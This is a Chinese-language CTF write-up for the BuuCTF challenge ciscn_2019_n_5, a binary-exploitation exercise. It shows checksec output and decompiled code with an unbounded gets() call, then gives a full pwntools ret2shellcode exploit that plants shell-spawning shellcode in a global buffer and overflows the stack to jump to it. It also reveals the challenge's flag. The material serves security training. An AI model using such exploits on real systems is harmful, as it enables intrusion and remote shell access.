---
tags:
  - BuuCTF
  - 简单
  - ret2shellcode
---

# ciscn_2019_n_5

## 前置工作

先来个 CheckSec，结果如下

```bash
┌──(ela㉿kali)-[~/桌面]
└─$ checksec ciscn_2019_n_5       
[*] '/home/ela/桌面/ciscn_2019_n_5'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

NX unknown，感觉像是可以构建 ShellCode

用 IDA 64 打开附件 `ciscn_2019_n_5`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char text[30]; // [rsp+0h] [rbp-20h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  puts("tell me your name");
  read(0, name, 0x64uLL);
  puts("wow~ nice name!");
  puts("What do you want to say to me?");
  gets((__int64)text);
  return 0;
}
```

如果是 ret2shellcode 的话，可以把 ShellCode 弄到 `name` 里面，然后在 `gets()` 函数中造成栈溢出，让程序能跑到 `name` 的位置上

经过查找，发现 `name` 的位置在 `0x601080`

## 编写 Exp

```python
from pwn import *
context.binary = ELF("./ciscn_2019_n_5")

io = remote("node4.buuoj.cn", 26536)
shellcode = asm(shellcraft.sh())
name_addr = 0x601080
io.recvuntil(b"tell me your name\n")
io.sendline(shellcode)
payload = b"a"*(0x20+0x8)+pack(name_addr, 64)
io.recvuntil(b"What do you want to say to me?\n")
io.sendline(payload)
io.interactive()

```

运行过后使用 `cat flag`，获得 Flag 为 `flag{88d7f7c4-dfe4-4ed5-8e06-c300f1013ae2}`